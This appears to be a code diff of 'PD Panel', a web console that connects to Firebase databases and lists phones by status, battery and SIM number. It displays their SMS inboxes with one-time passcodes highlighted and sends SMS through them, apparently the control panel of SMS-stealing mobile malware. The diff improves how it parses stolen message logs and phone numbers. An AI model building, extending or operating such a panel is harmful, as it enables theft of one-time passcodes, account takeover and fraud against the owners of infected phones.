@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PD Panel — Multi-Database</title>
-    <!-- Firebase SDK -->
+    <title>PD Panel — Fixed</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
@@ -16,11 +15,10 @@
             min-height: 100vh;
             display: flex;
         }
-
         .sidebar {
             width: 240px;
             background: rgba(12, 18, 28, 0.95);
-            border-right: 1px solid rgba(255, 255, 255, 0.04);
+            border-right: 1px solid rgba(255,255,255,0.04);
             padding: 20px 14px;
             display: flex;
             flex-direction: column;
@@ -87,9 +85,7 @@
             margin-top: 6px;
         }
         .sidebar .db-section .add-db-btn:hover { background: rgba(79,195,247,0.1); }
-
         .main-content { flex: 1; padding: 24px 28px; overflow-y: auto; height: 100vh; }
-
         .header {
             display: flex;
             justify-content: space-between;
@@ -108,7 +104,6 @@
             transition: all 0.2s;
         }
         .header .actions button:hover { background: rgba(255,255,255,0.08); }
-
         .stats-row {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
@@ -126,7 +121,6 @@
         .stat-card .value.offline { color: #6a7a8e; }
         .stat-card .value.sims { color: #4fc3f7; }
         .stat-card .label { font-size: 11px; color: #6a7a8e; text-transform: uppercase; letter-spacing: 0.3px; margin-top: 2px; }
-
         .content-grid {
             display: grid;
             grid-template-columns: 1fr 360px;
@@ -136,7 +130,6 @@
             .content-grid { grid-template-columns: 1fr; }
             .stats-row { grid-template-columns: repeat(2, 1fr); }
         }
-
         .panel {
             background: rgba(16,24,40,0.6);
             border-radius: 10px;
@@ -159,7 +152,6 @@
         }
         .panel .panel-header .pick-device { font-size: 11px; color: #6a7a8e; }
         .panel .panel-header .pick-device strong { color: #c8d4e0; }
-
         .device-list {
             max-height: 400px;
             overflow-y: auto;
@@ -168,7 +160,6 @@
         .device-list::-webkit-scrollbar { width: 3px; }
         .device-list::-webkit-scrollbar-track { background: rgba(255,255,255,0.02); border-radius: 2px; }
         .device-list::-webkit-scrollbar-thumb { background: rgba(79,195,247,0.15); border-radius: 2px; }
-
         .device-item {
             display: flex;
             justify-content: space-between;
@@ -196,7 +187,6 @@
             padding: 0 8px;
             border-radius: 8px;
         }
-
         .inbox-messages {
             max-height: 380px;
             overflow-y: auto;
@@ -205,7 +195,6 @@
         .inbox-messages::-webkit-scrollbar { width: 3px; }
         .inbox-messages::-webkit-scrollbar-track { background: rgba(255,255,255,0.02); border-radius: 2px; }
         .inbox-messages::-webkit-scrollbar-thumb { background: rgba(79,195,247,0.15); border-radius: 2px; }
-
         .inbox-message {
             background: rgba(0,0,0,0.2);
             border-radius: 6px;
@@ -224,7 +213,6 @@
         .inbox-message .msg-body { font-size: 12px; color: #c8d4e0; word-break: break-word; }
         .inbox-message .msg-body .otp { color: #ffd54f; font-weight: 600; }
         .inbox-placeholder { text-align: center; color: #4a5a6e; font-size: 12px; padding: 30px 0; }
-
         .send-sms-area {
             margin-top: 12px;
             padding-top: 12px;
@@ -256,7 +244,6 @@
         }
         .send-sms-area .send-btn:hover { background: rgba(79,195,247,0.15); }
         .send-sms-area .send-btn:disabled { opacity: 0.3; cursor: not-allowed; }
-
         .modal-overlay {
             display: none;
             position: fixed;
@@ -319,7 +306,6 @@
         }
         .modal .modal-actions .connect:hover { background: #3da8e0; }
         .modal .modal-actions .connect:disabled { opacity: 0.4; cursor: not-allowed; }
-
         .toast {
             position: fixed;
             bottom: 24px;
@@ -340,7 +326,6 @@
             from { opacity: 0; transform: translateX(-50%) translateY(10px); }
             to { opacity: 1; transform: translateX(-50%) translateY(0); }
         }
-
         @media (max-width: 768px) {
             .sidebar { width: 60px; padding: 16px 8px; }
             .sidebar .logo { font-size: 14px; text-align: center; }
@@ -417,7 +402,7 @@
     <div class="modal-overlay" id="connectModal">
         <div class="modal">
             <h2>🔗 Connect to Firebase</h2>
-            <div class="sub">Enter your Firebase Realtime Database URL with optional auth</div>
+            <div class="sub">Enter your Firebase Realtime Database URL</div>
             <label>Database URL</label>
             <input type="text" id="dbUrlInput" placeholder="https://your-project.firebaseio.com">
             <label>Auth Token (optional)</label>
@@ -446,7 +431,6 @@
         let connectedDbs = [];
         let dbListeners = [];
         let isConnected = false;
-        let deviceCounter = 0;
 
         // ===== DOM REFS =====
         const deviceListEl = document.getElementById('deviceList');
@@ -499,6 +483,13 @@
 
         function getPhoneNumber(deviceData) {
             if (!deviceData || typeof deviceData !== 'object') return null;
+            // Check simInfo first
+            if (deviceData.simInfo) {
+                for (const key in deviceData.simInfo) {
+                    const sim = deviceData.simInfo[key];
+                    if (sim && sim.number) return String(sim.number);
+                }
+            }
             const fields = ['mobNo', 'mobile', 'phone', 'phoneNumber', 'number'];
             for (const f of fields) {
                 if (deviceData[f]) return String(deviceData[f]);
@@ -522,11 +513,11 @@
 
         function getSmsCount(deviceData) {
             if (!deviceData || typeof deviceData !== 'object') return 0;
-            if (deviceData.messages && typeof deviceData.messages === 'object') {
-                return Object.keys(deviceData.messages).length;
-            }
             if (deviceData.sms_logs && typeof deviceData.sms_logs === 'object') {
                 return Object.keys(deviceData.sms_logs).length;
+            }
+            if (deviceData.messages && typeof deviceData.messages === 'object') {
+                return Object.keys(deviceData.messages).length;
             }
             return 0;
         }
@@ -535,10 +526,10 @@
             if (!deviceData || typeof deviceData !== 'object') return [];
             let messages = [];
             let source = null;
-            if (deviceData.messages && typeof deviceData.messages === 'object') {
-                source = deviceData.messages;
-            } else if (deviceData.sms_logs && typeof deviceData.sms_logs === 'object') {
+            if (deviceData.sms_logs && typeof deviceData.sms_logs === 'object') {
                 source = deviceData.sms_logs;
+            } else if (deviceData.messages && typeof deviceData.messages === 'object') {
+                source = deviceData.messages;
             }
             if (source) {
                 const entries = Object.entries(source);
@@ -597,11 +588,9 @@
                 return;
             }
 
-            // Clean URL — remove any trailing slashes and auth
             let cleanUrl = url.split('?')[0];
             if (cleanUrl.endsWith('/')) cleanUrl = cleanUrl.slice(0, -1);
 
-            // If auth is provided, add it to the URL for the connection
             let fullUrl = cleanUrl;
             if (auth) {
                 fullUrl = cleanUrl + '?auth=' + encodeURIComponent(auth);
@@ -612,7 +601,6 @@
             btn.textContent = 'Connecting...';
 
             try {
-                // Create app instance
                 const appName = 'panel_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
                 const config = { databaseURL: cleanUrl };
                 const app = firebase.initializeApp(config, appName);
@@ -667,44 +655,13 @@
 
             const keys = Object.keys(data);
 
-            // Case 1: Direct device list with status/battery
+            // Case 1: Shallow keys with boolean values (users.json?shallow=true)
             if (keys.length > 0) {
                 const firstKey = keys[0];
                 const firstVal = data[firstKey];
 
-                // If values are objects with device properties
-                if (firstVal && typeof firstVal === 'object') {
-                    // Check if it's a device list
-                    if (firstVal.status !== undefined || firstVal.battery !== undefined || firstVal.mobNo !== undefined) {
-                        keys.forEach(id => {
-                            const deviceData = data[id];
-                            allDevices[id] = {
-                                dbUrl: connInfo.url,
-                                node: connInfo.node,
-                                data: deviceData,
-                                messages: getAllMessages(deviceData)
-                            };
-                        });
-                        return;
-                    }
-
-                    // If values are messages (have message, sender, timestamp)
-                    if (firstVal.message !== undefined || firstVal.sender !== undefined) {
-                        // Create a virtual device for this messages node
-                        const virtualId = 'msg_' + connInfo.node + '_' + Date.now() + '_' + Math.random().toString(36).substr(2, 3);
-                        allDevices[virtualId] = {
-                            dbUrl: connInfo.url,
-                            node: connInfo.node,
-                            data: { messages: data },
-                            messages: getAllMessages({ messages: data }),
-                            isVirtual: true
-                        };
-                        return;
-                    }
-                }
-
-                // If values are primitive (shallow keys) — fetch each device individually
-                if (typeof firstVal === 'boolean' || firstVal === true) {
+                if (typeof firstVal === 'boolean' || firstVal === true || firstVal === false) {
+                    // Fetch each device's full data
                     keys.forEach(id => {
                         connInfo.ref.child(id).once('value').then((snap) => {
                             const deviceData = snap.val();
@@ -721,9 +678,38 @@
                     });
                     return;
                 }
+
+                // Case 2: Direct device list with status/battery
+                if (firstVal && typeof firstVal === 'object') {
+                    if (firstVal.status !== undefined || firstVal.battery !== undefined || firstVal.mobNo !== undefined) {
+                        keys.forEach(id => {
+                            const deviceData = data[id];
+                            allDevices[id] = {
+                                dbUrl: connInfo.url,
+                                node: connInfo.node,
+                                data: deviceData,
+                                messages: getAllMessages(deviceData)
+                            };
+                        });
+                        return;
+                    }
+
+                    // Case 3: Messages node
+                    if (firstVal.message !== undefined || firstVal.sender !== undefined) {
+                        const virtualId = 'msg_' + connInfo.node + '_' + Date.now() + '_' + Math.random().toString(36).substr(2, 3);
+                        allDevices[virtualId] = {
+                            dbUrl: connInfo.url,
+                            node: connInfo.node,
+                            data: { messages: data },
+                            messages: getAllMessages({ messages: data }),
+                            isVirtual: true
+                        };
+                        return;
+                    }
+                }
             }
 
-            // Fallback: if nothing matched, treat as a single device
+            // Fallback
             if (data.message !== undefined || data.sender !== undefined) {
                 const virtualId = 'msg_' + Date.now() + '_' + Math.random().toString(36).substr(2, 3);
                 allDevices[virtualId] = {
@@ -744,7 +730,6 @@
                 const key = snapshot.key;
                 const data = snapshot.val();
                 if (key && data && typeof data === 'object') {
-                    // Check if it's a device
                     if (data.status !== undefined || data.battery !== undefined || data.mobNo !== undefined) {
                         allDevices[key] = {
                             dbUrl: connInfo.url,
@@ -755,7 +740,6 @@
                         renderAll();
                         showToast('📱 New device: ' + key.substring(0, 12) + '...');
                     } else if (data.message !== undefined || data.sender !== undefined) {
-                        // New message — add to a virtual device
                         const virtualId = 'msg_' + connInfo.node + '_' + connInfo.url.substring(0, 20);
                         if (!allDevices[virtualId]) {
                             allDevices[virtualId] = {
@@ -1022,7 +1006,7 @@
         window.refreshData = refreshData;
         window.sendSms = sendSms;
 
-        console.log('✅ PD Panel loaded');
+        console.log('✅ PD Panel loaded — ready to connect to Firebase.');
     </script>
 </body>
 </html>
